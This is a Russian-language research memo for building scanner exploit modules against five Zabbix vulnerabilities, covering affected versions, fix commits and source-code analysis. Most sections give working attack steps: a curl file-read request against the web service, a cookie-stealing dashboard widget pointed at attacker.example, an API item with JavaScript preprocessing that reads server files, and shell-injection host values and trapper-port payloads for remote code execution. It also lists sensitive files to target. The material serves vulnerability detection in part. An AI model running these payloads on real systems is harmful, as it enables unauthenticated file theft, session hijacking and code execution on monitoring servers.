# Deep technical protocols: Zabbix vulnerability vectors (2016–2026)

Исследовательская записка для написания эксплойт-модулей сканнера.
Все данные — по первоисточникам (исходный код zabbix-репозитория на тегах GitHub, Jira ZBX-*, advisory Zabbix, NVD/CVE.org). Что не подтверждено напрямую — помечено `[INFERENCE]`/`[UNVERIFIED]`.

Данные по датам публикаций: CVE-2022-46768, CVE-2023-32725, CVE-2023-29450, CVE-2024-22116, CVE-2020-11800.

---

## CVE-2022-46768 (ZBX-22087) — Arbitrary file read через Zabbix Web Service Report Generation

- Тикет/первоисточник: https://support.zabbix.com/browse/ZBX-22087 (ZBV-2022-09-1); fix-коммиты: 6.0.12rc1 `fdb03971867`, 6.2.6rc1 `58a857adbfc`, 6.4.0rc1 `1d92fad6541` (git.zabbix.com).
- Вектор: **unauthenticated HTTP(S) POST на порт 10053** (zabbix_web_service), эндпоинт `/report`, Content-Type `application/json`. Сервис под управлением headless Chrome (chromedp) переходит по URL из JSON-поля и возвращает PDF-рендер страницы. В уязвимых версиях **схема URL не валидируется вообще** → `file://` позволяет прочитать произвольный локальный файл с машины web service (Chrome рендерит содержимое файла в PDF-ответе).

### Точный протокол (проверено по исходникам)

Уязвимый код: `src/go/cmd/zabbix_web_service/pdf_report_creator.go` (ветки ≤6.0.11, 6.2.0–6.2.5; в 6.2/6.4 аналогично). Проверено на теге **6.0.11** (GitHub):

```go
type requestBody struct {
    URL        string            `json:"url"`
    Header     map[string]string `json:"headers"`
    Parameters map[string]string `json:"parameters"`
}
...
u, err := parseUrl(req.URL)      // проверяется только: не пусто и есть scheme
...
chromedp.Run(ctx, chromedp.Tasks{
    network.SetExtraHTTPHeaders(... "Cookie": req.Header["Cookie"]),
    emulation.SetDeviceMetricsOverride(width, height, 1, false),
    navigateAndWaitFor(u.String(), "networkIdle"),  // page.Navigate(URL) + wait networkIdle
    ... page.PrintToPDF() ...
})
// ответ: Content-Type: application/pdf, тело = PDF
```

Запрос (в точности как его формирует zabbix_server, `src/zabbix_server/reporter/report_writer.c` → `rw_get_report()`):

```http
POST /report HTTP/1.1
Host: <zabbix-web-service>:10053
Content-Type: application/json

{"url":"file:///etc/passwd","headers":{"Cookie":"zbx_session=anything"},"parameters":{"width":"800","height":"600"}}
```

- `width`/`height` обязательны: парсятся через `strconv.ParseInt(..., 10, 64)` → при отсутствии/нечисловом значении вернётся 400 `{"detail":"Incorrect parameter width: ..."}`.
- `headers` необязателен (используется как Cookie-заголовок для headless Chrome).
- Ответ при успехе: `200`, `Content-Type: application/pdf`, тело — PDF с отрендеренным содержимым `/etc/passwd` (текстовые файлы Chrome рендерит как plain text). Полезно для чтения: `/etc/passwd`, `/etc/shadow` (если юзер прочитает), конфиги Zabbix (`/etc/zabbix/zabbix_server.conf` — содержит DBPassword, хоть и с ограничениями прав), ключи, `/proc/self/environ` и т.п.
- Ошибки: 400 `application/problem+json` `{"detail":"..."}`; 500 при ошибках Chrome; 405 если метод не POST; 401/500 если RemoteAddr не в AllowedIP.

### Условия / ограничения

1. **AllowedIP**: в `zabbix_web_service.conf` опция `AllowedIP` (конфиг `src/go/cmd/zabbix_web_service/config.go`: `ListenPort` default `10053`, `AllowedIP` optional, `Timeout` default 3s, range 1–30). `zbxnet.GetAllowedPeers("")` → пустой список → **все подключения отклоняются** (`CheckPeer` вернёт false). Default в Docker-образе `zabbix/zabbix-web-service:6.0.27-alpine`: `ZBX_ALLOWEDIP="zabbix-server"` (имя хоста контейнера сервера, docker-entrypoint.sh), т.е. по умолчанию сеть ограничена контейнером сервера. Реально эксплуатируемо, когда: порт 10053 опубликован и AllowedIP расширен (например на подсеть docker / `0.0.0.0/0` / имя, резолвящееся в доступный адрес), либо атакующий уже имеет доступ с разрешённого адреса. Advisory ZBX-22087: precondition — "web service has to allow the access from attacker's IP".
2. На хосте web service должен быть установлен headless Chrome (в офиц. образе — пакет `chromium`, запуск с `--no-sandbox` через патч образа `chromedp_no_sandbox.patch`, добавляющий `chromedp.NoSandbox`, `disable-setuid-sandbox`).
3. Уязвимые версии: **< 6.0.12, 6.2.0–6.2.5, < 6.4.0beta5** (по Jira; Snyk: [6.0.0,6.0.12rc1), [6.2.0,6.2.6rc1)). 6.0.12+ и выше — запросы с не-http(s) схемой, путём ≠ `.../zabbix.php` или `action != dashboard.print` получают 400 `Unexpected URL scheme/path/action`.

### Фикс (что проверяет модуль-детектор на патченных версиях)

В 6.0.12rc1 добавлено (диф 6.0.11→6.0.27):

```go
if u.Scheme != "http" && u.Scheme != "https" { ... "Unexpected URL scheme" ... 400 }
if !strings.HasSuffix(u.Path, "/zabbix.php") { ... "Unexpected URL path" ... }
if queryParams.Get("action") != "dashboard.print" { ... "Unexpected URL action" ... }
```

### POC

null (публичных PoC не найдено; протокол полностью восстановлен из исходников + патч-диффа). Проверочный payload для сканнера:

```bash
curl -s -H 'Content-Type: application/json' \
  -d '{"url":"file:///etc/passwd","headers":{},"parameters":{"width":"800","height":"600"}}' \
  http://<TARGET>:10053/report | head -c 200   # ожидается "%PDF" (успех) или 400 with "Unexpected URL scheme"/"Incorrect request url"
```

- 200 + `%PDF` → уязвимо (файл прочитан).
- 400 `Unexpected URL scheme` / `Unexpected URL path` / `Unexpected URL action` → патчено.
- 500 `detail: Cannot accept incoming connection for peer` → AllowedIP блокирует (не эксплуатируемо напрямую).
- `Incorrect request url: ...` на `file://` тоже означает патч (схема проверялась в parseUrl? нет — в 6.0.11 parseUrl только требует scheme; в патче scheme-ошибку даёт отдельная проверка).

- Неоднозначности: точный ответ на `file://` при отсутствии Chrome (например, Alpine без chromium) — PDF не сгенерируется, будет 500 `Cannot fetch data ...`; это не влияет на детект. В 6.2/6.4.0 были идентичные реализации [INFERENCE по паттерну фикса — не проверял построчно].

---

## CVE-2023-32725 (ZBX-23854) — Leak zbx_session cookie через URL-widget в scheduled report

- Тикет/первоисточник: https://support.zabbix.com/browse/ZBX-23854 (CVE-2023-32725, CVSS 9.6, CWE-565/CAPEC-593/233). Fix-коммиты (web service + server): 6.0.22rc1 `89e0cd6ea93`, 6.4.7rc1 `3f22d7dd372`, 7.0.0alpha5 `4428a58a30f`.
- Затронуто: **6.0.0–6.0.21, 6.4.0–6.4.6, 7.0.0alpha1–alpha3**; фикс 6.0.22rc1 / 6.4.7rc1 / 7.0.0alpha4.
- Вектор: session hijacking (сбор чужой `zbx_session` cookie) через URL widget внутри dashboard при генерации/тесте scheduled report.

### Механика (проверено по коду web service)

1. Отчёт (PDF) генерирует web service: сервер шлёт POST `/report` с `{"url":"http://<frontend>/zabbix.php?action=dashboard.print&dashboardid=...","headers":{"Cookie":"zbx_session=<session>"},"parameters":{w,h}}` → headless Chrome грузит dashboard пользователя, делает PrintToPDF, отдаёт PDF.
2. Dashboard может содержать **URL widget** (iframe), URL которого задаёт пользователь с правом редактирования дашбордов.
3. Уязвимость: в web service до фикса cookie передавалась как **глобальный HTTP-заголовок на ВСЕ запросы браузера**:

   `network.SetExtraHTTPHeaders(network.Headers(map[string]interface{}{"Cookie": req.Header["Cookie"]}))` — проверено на теге **6.0.21** (строка 163 pdf_report_creator.go).

   → запрос iframe (URL widget) на любой внешний домен уходит с заголовком `Cookie: zbx_session=<session>`.
4. Фикс (6.0.22rc1): вместо raw SetExtraHTTPHeaders — `network.SetCookies()` с параметрами `{Name, Value, URL: req.URL, Domain: u.Hostname(), SameSite: Strict, HTTPOnly: true}` — cookie теперь привязана к хосту дашборда (zabbix frontend), на чужие домены (iframe) не уходит. Проверено на теге 6.0.27.

### Сценарий эксплуатации (точные шаги)

Предпосылки:
- На Zabbix есть пользователь с ролью, дающей: редактирование dashboard (создание/изменение URL widget) + запуск/тест scheduled reports (права `UI: Reports → Scheduled reports` / `Actions: Manage scheduled reports` — по Jira "scheduled reports are available to Admin and Super admin user types"; в 6.0 также любой role-based доступ). Атакующий либо сам такой пользователь, либо подбивает жертву (UI:R, phishing/CSRF маловероятен — нужен вход в UI).
- Zabbix web service запущен и виден (обязателен, т.к. отчёт рендерится им).

Шаги:
1. Атакующий получает/использует права пользователя (Admin/Super admin) и создаёт dashboard с URL widget: `https://attacker.example/capture?rid=<random>` (или добавляет такой widget в существующий dashboard, доступный пользователю).
2. Создаёт scheduled report на этот dashboard (Reports → Scheduled reports → Create report), период любой.
3. Триггер:
   - **Test**: кнопка "Test" в форме отчёта (фронтенд `CControllerPopupScheduledReportTest` → `CZabbixServer->testReport()` → сервер запускает генерацию через web service). — самый быстрый способ.
   - Либо дождаться **автоматического выполнения** отчёта по расписанию.
4. Web service рендерит dashboard; iframe URL widget → GET `https://attacker.example/capture?...` с заголовком `Cookie: zbx_session=<session создателя отчёта>`.
5. Attacker.example логирует Cookie → атакующий подставляет `zbx_session` в свой браузер/API-клиент → полный доступ к фронтенду с правами жертвы (session hijack).

API-эквиваленты для автоматизации (6.0.x):
- Создание/правка дашборда: `POST /api_jsonrpc.php` `method: dashboard.create` / `dashboard.update`, widget `type: "url"`, поле `url` = внешний URL. Требуются права на dashboard.
- Тест отчёта через API прямого метода нет [UNVERIFIED — в 6.0 тест только из UI]; автоматическое выполнение — по расписанию (cron репорт-менеджер сервера).
- Для сканнера: детект = версия в затронутом диапазоне **И** web service отвечает на `/report` (т.е. отчёт-функция подключена). Полный функциональный тест (создать дашборд+виджет+отчёт) требует полноправной учётки Admin.

### Детали для детекта версий (web service-часть)

Косвенный признак патченности: web service на теге ≥6.0.22 отвечает 400 `Unexpected URL path/action` при `url` без `.../zabbix.php` — но это признак фикса CVE-2022-46768, а не 32725. Надёжный признак CVE-2023-32725 — только версия бинарника web service / пакета [INFERENCE]. Также фикс 32725 включает server-часть (коммит 89e0cd6ea93, изменял ли сервер протокол — не проверено; вероятно ограничение/изоляция cookie на уровне сервера [INFERENCE]).

- Неоднозначности:
  - Точные изменения server-компонента (89e0cd6ea93) не проверены (git.zabbix.com закрыт для анонимных диффов) — [INFERENCE по описанию Jira: компоненты Server + Web service].
  - Наличие URL widget в dashboard, принадлежащем жертве, сценарий предполагает участие жертвы с правами Admin/Super admin. CVSS 9.6 с UI:R это учитывает.

### POC

null (публичного PoC нет; по данным Known attack vectors в Jira).

---

## CVE-2023-29450 (ZBX-22588) — Unauthorized file system access через JavaScript preprocessing

- Тикет/первоисточник: https://support.zabbix.com/browse/ZBX-22588 (ZBV-2023-07-27-2, advisory https://www.zabbix.com/security_advisories#ZBV-2023-07-27-2). Fix-коммиты: pre-5.0.32rc1 `c3f1543e4b2`+`ea514f12340`, pre-6.0.14rc2 `76f6a80cb3d`+`5493152e73d`, pre-6.2.8rc2 `3fe0ec46523`+`5213cc393a7`, pre-6.4.0rc3 `c34f799cbb8`+`a28a57af21b`, master `a28a57af21b`.
- Затронуто: см. «Проверка версий» ниже. По коду 6.0: **6.0.0–6.0.13** (6.0.14+ содержит протокольный фикс); по Jira-заголовку (security-релизы): 5.0.x<5.0.34, 6.0.x<6.0.16, 6.2.x<6.2.9, 6.4.x<6.4.2, 7.0.0alpha1.
- Вектор: JavaScript-движок (duktape) на сервере/прокси выполняет JS-код шага preprocessing; JS-API включает объект **`HttpRequest`**, который в уязвимых версиях **не ограничивает протоколы libcurl** → `file://` (и любые другие схемы — ftp, gopher, ldap, scp/sftp при наличии модулей) читает локальный ФС **от имени пользователя `zabbix`** на Zabbix Server или Proxy.

### Механика (проверено по коду, 6.0.13 vs 6.0.16)

Уязвимый код `src/libs/zbxembed/httprequest.c` (тег 6.0.13, строка ~291): в `es_httprequest_query()` после `CURLOPT_URL` **нет** `CURLOPT_PROTOCOLS` → libcurl использует дефолт: разрешены ВСЕ протоколы, включая `file`.

Фикс (тег 6.0.16, строки 359–360):

```c
/* CURLOPT_PROTOCOLS is supported starting with version 7.19.4 */
ZBX_CURL_SETOPT(ctx, request->handle, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS, err);
```

(регрессии фикса — ZBX-23980 "rtsp", ZBX-23982 "ftp" в Web Monitoring — подтверждают, что ограничение протоколов применялось в общем коде.)

### Как запустить (точный технический сценарий)

Предпосылка для эксплуатации: аутентифицированный пользователь, имеющий **право конфигурации хоста** (Read-write по группе хостов; этого достаточно для создания/правки items, отдельного права "add items" в классической модели 5.x–6.4 нет). Роль `User` с правами на host group подходит. **Не требует** роли Admin.

1. Получить `hostid` хоста, на который есть права записи: `POST /api_jsonrpc.php` `{"method":"host.get","params":{"output":["hostid","name"],"editable":true}}` (с auth-токеном; пользователю с read-write правами вернётся хост).
2. Создать item с шагом JavaScript preprocessing, который читает файл (константы проверены по 6.0.27: тип JS-шага **21** = `ZBX_PREPROC_SCRIPT` (`ui/include/defines.inc.php`; UI-подпись «JavaScript» в `ui/include/items.inc.php`), тип item «Zabbix internal» **5** = `ITEM_TYPE_INTERNAL`):

```json
{
  "jsonrpc": "2.0", "method": "item.create",
  "params": {
    "name": "js_read",
    "key_": "zabbix[boottime]",
    "hostid": "<hostid>",
    "type": 5,
    "value_type": 0,
    "delay": "30s",
    "preprocessing": [
      {
        "type": 21,
        "params": "var r = new HttpRequest();\nreturn r.get('file:///etc/passwd');"
      }
    ]
  },
  "auth": "<token>", "id": 1
}
```

   - `HttpRequest` — глобальный конструктор JS-движка, регистрируется в **любой** ES-среде (`zbx_es_init_env` → `zbx_es_init_httprequest`, embed.c), включая preprocessing-воркеры сервера/прокси. `r.get(url)` возвращает тело ответа строкой (`es_httprequest_query` → `duk_push_lstring`).
   - Тип item **5 (internal)** с ключом `zabbix[boottime]` (ключ-серверная статистика, `src/libs/zbxserver/zabbix_stats.c`): сервер сам генерирует значение по расписанию → **JS preprocessing отработает автоматически без внешнего источника данных** (ни агент, ни trapper не нужны). Самый простой триггер.
   - Либо trapper item (`type`: 2) и отправка значения: `zabbix_sender -z <SERVER> -p 10051 -s <hostname> -k zabbix[boottime] -o 1` — приём trapper-данных на 10051 без аутентификации; дальше preprocessing-воркер сервера выполнит JS.
3. Дождаться первого сбора (delay) или отправки trapper-значения.
4. Прочитать результат (файл — в lastvalue): `POST /api_jsonrpc.php` `{"method":"item.get","params":{"itemids":["<itemid>"],"output":["itemid","lastvalue","lastclock"]},"auth":"...","id":2}` → `result[0].lastvalue` содержит содержимое `/etc/passwd`.
   - Альтернатива (обычный пользователь без API-клиента): UI → Latest data → item → последнее значение.

Примечание: JS в preprocessing исполняется серверным процессом от имени ОС-пользователя, под которым запущен zabbix_server/zabbix_proxy (обычно `zabbix`) — read-only доступ к файлам, читаемым этим юзером (типично: /etc/passwd, конфиги zabbix в /etc/zabbix — часто 644, файлы БД нет, /proc частично). "Unauthorized": эскалация от прав на группу хостов к чтению ФС сервера. Webhook/global script JS тоже используют `HttpRequest` — тот же примитив; CVE привязан к preprocessing как наиболее «низкопороговому» месту.

### Проверка версий для сканнера (важно: код vs заголовок Jira)

**Код-подтверждённый факт (6.0):** ограничение `CURLOPT_PROTOCOLS = HTTP|HTTPS` в `src/libs/zbxembed/httprequest.c` присутствует уже в **6.0.14** (проверено: 6.0.13 — нет, 6.0.14/6.0.15/6.0.16 — есть). Т.е. фактически уязвимо **6.0.0–6.0.13**, 6.0.14+ патчено.
- В заголовке Jira Fix Version стоит 6.0.16rc1 (security-релиз, к которому привязали анонс), а в комментарии — коммиты «pre-6.0.14rc2». Для детектора использовать фактическую границу по коду: **< 6.0.14**.
- По аналогии (комментарий в ZBX-22588, «pre-5.0.32rc1 / pre-6.2.8rc2 / pre-6.4.0rc3 / pre-7.0.0alpha1»), фактический фикс в ветках 5.0/6.2/6.4/7.0 должен быть в **5.0.32 / 6.2.8 / 6.4.0 / 7.0.0alpha1** [INFERENCE — тегов этих версий на GitHub-зеркале нет, проверить по целевой версии: наличие `CURLOPT_PROTOCOLS` в `src/libs/zbxembed/httprequest.c` исходников]. Заголовок Jira (независимо): 5.0.34rc1 / 6.2.9rc2 / 6.4.2rc1 / 7.0.0alpha1.
- Итог для версионного детекта (консервативный): 5.0.0–5.0.31, 6.0.0–6.0.13, 6.2.0–6.2.7, 6.4.0–6.4.1 уязвимы; 5.0.32+/6.0.14+/6.2.8+/6.4.0+ патчены (по комментарию фикса; для 6.2/6.4 — [INFERENCE]).
- Для 5.0: константа типа JS-шага preprocessing в 5.0 может отличаться от 21 — проверить в `ui/include/defines.inc.php` целевой версии перед написанием модуля [INFERENCE].

### POC

null (публичные PoC не найдены; есть HackerOne-репорт, упомянутый в анонсе [UNVERIFIED]). Механика подтверждена диффом исходников.

### Неоднозначности

- Точные константы `ZBX_PREPROC_JS`/`type` в 5.0/6.2/6.4 — по аналогии с 6.0 [INFERENCE]; проверить в `ui/include/defines.inc.php` целевой версии.
- Атака через JS preprocessing требует, чтобы на сервере был собран поддержный JS-движок (все штатные сборки — да).
- `HttpRequest` в 6.0.13 — глобальный конструктор (зарегистрирован через `zbx_es_init_httprequest`, имена `HttpRequest` и `CurlHttpRequest`; методы get/post/put/patch/delete/customRequest/addHeader и т.д.).

---

## CVE-2024-22116 (ZBX-25016) — RCE через параметры скрипта Ping (restricted admin)

- Тикет/первоисточник: https://support.zabbix.com/browse/ZBX-25016 (CVE-2024-22116, CVSS 9.9, PR:L; HackerOne: justonezero / qusaialhaddad). Fix: 6.4.16rc1, 7.0.0rc3.
- Затронуто: **6.4.9–6.4.15 (фикс 6.4.16rc1), 7.0.0alpha1–7.0.0rc2 (фикс 7.0.0rc3)**. 6.0/5.0/… — не затронуты (по Affected versions в Jira).
- Вектор: **command injection через макрос `{HOST.CONN}` (параметр скрипта) при выполнении глобального скрипта "Ping" с сервера**; роль — "администратор с ограниченными правами" (restricted admin: есть права на выполнение скриптов в Monitoring → Hosts и на конфигурацию хоста, но не полный Super admin). Команда `ping -c 3 {HOST.CONN}; case $? in [01]) true;; *) false;; esac` исполняется **на Zabbix Server** (`execute_on` = server) в shell; значение `{HOST.CONN}` подставляется **без экранирования** (lack of default escaping for script parameters).

### Детали (проверено/частично проверено)

- Дефолтный скрипт Ping в 7.0.0 (`create/src/data.tmpl`, строка `TABLE |scripts`):
  `Ping | ping -c 3 {HOST.CONN}; case $? in [01]) true;; *) false;; esac | host_access=2 | type=0 | execute_on=2 (server) | timeout=30s | usrgrpid=NULL | groupid=NULL`
  (аналогично Traceroute: `/usr/bin/traceroute {HOST.CONN}`; Detect operating system: `sudo /usr/bin/nmap -O {HOST.CONN}` — usrgrpid=7 Guests? — проверить).
- Исполнение: `src/libs/zbxscripts/scripts.c` → `zbx_script_execute()` → для `ZBX_SCRIPT_EXECUTE_ON_SERVER` → `zbx_execute(script->command, ...)` (обёртка `/bin/sh -c`). `{HOST.CONN}` резолвится в DNS/интерфейс хоста до вызова.
- Как "restricted admin" получает ввод в `{HOST.CONN}`: **через конфигурацию хоста** — поле интерфейса/DNS (или Host name?) хоста, на который есть write-права. `{HOST.CONN}` = DNS-имя хоста, иначе IP интерфейса. Зловредное значение с shell-метасимволами (`;`, `|`, `$()`, backticks) попадает в команду без экранирования → RCE на сервере от пользователя `zabbix`.
- Триггер: Monitoring → Hosts → (выбран хост) → "Execute" (иконка скрипта) → Ping; либо API: `POST /api_jsonrpc.php {"method":"script.execute","params":{"scriptid":<id Ping>,"hostid":<hostid>}}` (нужны права: доступ к скрипту — Ping host_access=2 = Read-write по группе хоста — и право исполнения `{HOST.CONN}`). В 6.4/7.0 `script.execute` через фронтенд передаёт `manualinput`, но Ping параметров manualinput не имеет — вводимое значение — только `{HOST.CONN}`.
- Почему это "РR:L" и "по умолчанию": дефолтные права ролевой модели: у роли Admin есть "Scripts → Execute scripts" и конфигурация хостов, но НЕ "Super admin"; плюс сам факт отсутствия escaping по умолчанию в подстановке макроса в command — любой владелец write-прав на хост и права на запуск скрипта получает RCE.

### Фикс

Официальных деталей патча нет (git.zabbix.com закрыт; дифф между 7.0.0rc2 и 7.0.0rc3 в `src/libs/zbxscripts`, `src/zabbix_server/*scripts*`, `ui/include/classes/api` не содержит изменений по escaping — вывод: правка в других файлах: **7.0.0rc3 vs rc2 отличается только `src/zabbix_server/server.c` (SMSDevices) в C-коде** и 3 PHP-файлами (CHistory sort, CItemHelper, CSystemInfoHelper) — ни один не про escaping) [UNVERIFIED — вероятно фикс в подстановке макросов перед exec или в валидации `{HOST.CONN}` в момент создания скрипта/выполнения; ближайший кандидат — `src/libs/zbxcommon/zbxmacro.c` / `zbx_str_replace`-цепочка или добавленный экранирующий режим для script command].

  Механизм фикса (по формулировке Jira "lack of default escaping for script parameters") — добавлено экранирование значений параметров скриптов по умолчанию [INFERENCE].

### Проверочные шаги для сканнера/модуля

1. Версия в диапазоне 6.4.9–6.4.15 или 7.0.0alpha1–7.0.0rc2.
2. Есть учётка с: правами write на хост (или право create host) + доступом к скрипту Ping (по умолчанию host_access=2 → требует read-write прав на ту же группу) + правом execute scripts в роли.
3. Создать/изменить хост так, чтобы DNS (или интерфейс) = `127.0.0.1;touch /tmp/zab_pwn_<rand>` (в UI Host → DNS name; API `host.update`/`host.create` c `interfaces[].dns`).
4. Выполнить: `script.execute {scriptid: <id Ping>, hostid: <hostid>}` (или UI Execute → Ping).
5. Проверка RCE: `;touch /tmp/...` на сервере; результат скрипта вернётся в `result.value` (там будет вывод ping + код).
   - Нюанс: некоторые роли дают execute без write-прав на хост — тогда ввод в `{HOST.CONN}` невозможен; минимально нужны write-права на хост [INFERENCE из механики макроса].

### POC

null (HackerOne-репорт приватный). [UNVERIFIED: возможность инъекции именно через DNS-поле не подтверждена сторонним разбором; но механика {HOST.CONN}→shell без escaping подтверждена кодом `zbx_execute`/`zbx_script_execute`]

- Неоднозначности: где именно введён фикс (какой файл/механизм) — не подтверждено; «parameters» в названии CVE может также означать manualinput-параметры скриптов (JSON `manualinput`), а не только {HOST.CONN} [UNVERIFIED]. Для модуля безопаснее проверять оба пути инъекции.

---

## CVE-2020-11800 (ZBX-17600) — RCE на старых версиях (trapper command + auto-registration injection)

- Тикет/первоисточник: https://support.zabbix.com/browse/ZBX-17600 (репортёр FU CHUANG; фикс pre-3.0.31rc1 commit `ee39411033`). Vulhub-среда: https://github.com/vulhub/vulhub/tree/master/zabbix/CVE-2020-11800 (README ссылается на разбор https://xz.aliyun.com/t/8991).
- Затронуто (из тикета): **Zabbix 3.2 (EOL, НЕ чинился)**, **Zabbix 3.0 до 3.0.30 включительно (фикс 3.0.31)**, **Zabbix 2.2.x после 2.2.18 (EOL, НЕ чинился)**. Не затронуты: 3.4, 4.0, 5.0. RCE возможна **только на сервере** (не на агенте) — комментарий Андриса Медниса в тикете.

### Механика (vulhub PoC + анализ xz.aliyun.com/t/8991)

Command injection при исполнении **Ping-скрипта на сервере** через **trapper-порт 10051**, обход неполного патча CVE-2017-2824:

1. **Auto-registration**: attacker шлёт на порт 10051 запрос вида (активный агент + пользовательское поле `ip`):

   ```json
   {"request":"active checks","host":"vulhub","ip":"ffff:::;touch /tmp/success2"}
   ```

   Сервер (при включённой auto-registration) регистрирует новый хост; значение `ip` из запроса ложится в host-connection значение (аналог `{HOST.CONN}`). Фильтр из патча CVE-2017-2824 считает `ffff:::...` валидным IPv6-подобным адресом и **не пропускает блокировку** — `;` и команда проходят.

2. **Триггер исполнения**: на порт 10051 шлётся запрос `command` (серверная обработка "execute now" / script):

   ```json
   {"request":"command","scriptid":1,"hostid":<число>}
   ```

   `scriptid` 1 = глобальный скрипт "Ping" (`ping -c 3 {HOST.CONN}; case $? in [01]) true;; *) false;; esac`, `execute_on=server`). Сервер исполняет команду на себе: `ping -c 3 ffff:::;touch /tmp/success2` → RCE от пользователя ОС zabbix.

3. PoC перебирает `hostid` 10000–10500, пока не получит ответ без "failed" (успешный запуск).

Предусловия по vulhub: **включена auto-registration** (действие/правило авторегистрации в конфигурации). Точные требования верификации hostid/сессии в 3.0.x для запроса `command` — [UNVERIFIED] (в 3.0.x "command"-запрос на trapper-порт, по видимому, не требовал sessionid для скриптов, исполняемых на сервере — иначе vulhub PoC не работал бы; детали см. в разборе xz.aliyun.com/t/8991).

### Примечание к вопросу «operations vs script API / роль User»

- Эксплуатация здесь идёт **не через API `script.execute`**, а через траппер-протокол (10051) — т.е. без какой-либо авторизации фронтенда. Роль «User» не требуется (аноним).
- Отдельный смежный путь (в 2.2/3.0): API `script.execute` с правами обычного пользователя на скрипты, исполняемые на сервере — существовал, но для CVE-2020-11800 опубликованная механика — описанная выше trapper-цепочка [INFERENCE — я не подтверждал script.execute-путь диффом фикса].
- «2.2.x после 2.2.18» означает: уязвимость/недопатч появились в 2.2.19+ (после выхода патча CVE-2017-2824 в ветке 2.2 [INFERENCE]).

### Точные диапазоны (сводно, для версионного детекта)

| Ветка | Уязвимо | Фикс |
|---|---|---|
| 2.2.x | **2.2.19+ (после 2.2.18)** и до конца ветки | нет (EOL) |
| 3.0.x | **все до 3.0.30 включительно** | **3.0.31** |
| 3.2.x | **все** | нет (EOL) |
| 3.4/4.0/5.0+ | нет | — |

### POC

- https://github.com/vulhub/vulhub/tree/master/zabbix/CVE-2020-11800 (exploit.py, порт 10051, payload `ffff:::;touch /tmp/success2`, Docker-окружение с Zabbix 3.0.3).
- https://github.com/ycseo-git/CVE-2020-11800 (тот же механизм).

### Неоднозначности

- Проверка `command`-запроса: точный вид авторизации/сессии для `scriptid`/`hostid` в 3.0.x — не подтверждён (не достал исходники 3.0.30/3.0.31: cdn.zabbix.com 404, kernel.org нет, Debian snapshot нет 3.x, EPEL7 SRPM не найден, Wayback не архивировал; git.zabbix.com требует логин). Для функционального модуля требуется тестовая среда 3.0.30 (vulhub) — вектор проверится эмпирически.

---

## Сводка проверяемости для модулей

| CVE | Векторизация подтверждена | Версии (уязвимо) | Версии (фикс, факт. по коду) | Нужна аутентификация |
|---|---|---|---|---|
| 2022-46768 | Да (код web service 6.0.11/6.0.27) | <6.0.12; 6.2.0–6.2.5; <6.4.0beta5 | 6.0.12rc1/6.2.6rc1/6.4.0beta5 | Нет (только сеть до 10053 + AllowedIP) |
| 2023-32725 | Да (код web service 6.0.21/6.0.27 + Jira CVE Description) | 6.0.0–6.0.21; 6.4.0–6.4.6; 7.0.0alpha1–alpha3 | 6.0.22rc1/6.4.7rc1/7.0.0alpha4 | Да (Admin/прав на дашборды+отчёты) |
| 2023-29450 | Да (код httprequest.c 6.0.13 vs 6.0.14) | 5.0.0–5.0.31 [INF]; 6.0.0–6.0.13; 6.2.0–6.2.7 [INF]; 6.4.0–6.4.1 [INF] | 5.0.32 [INF] / 6.0.14 / 6.2.8 [INF] / 6.4.0 [INF] (Jira-заголовок: 5.0.34/6.0.16/6.2.9/6.4.2) | Да (write-права на хост) |
| 2024-22116 | Частично (команда/exec получены из кода 7.0.0; место фикса не найдено) | 6.4.9–6.4.15; 7.0.0alpha1–7.0.0rc2 | 6.4.16rc1/7.0.0rc3 | Да (restricted admin + write на хост) |
| 2020-11800 | Механика — да (vulhub PoC/разбор xz.aliyun.com); код фикса 3.0.31 не проверен (исходники EOL-веток недоступны) | 2.2.19+–2.2.x; 3.0.0–3.0.30; 3.2.x | только 3.0.31 | Нет (trapper-порт 10051, авторегистрация должна быть включена) |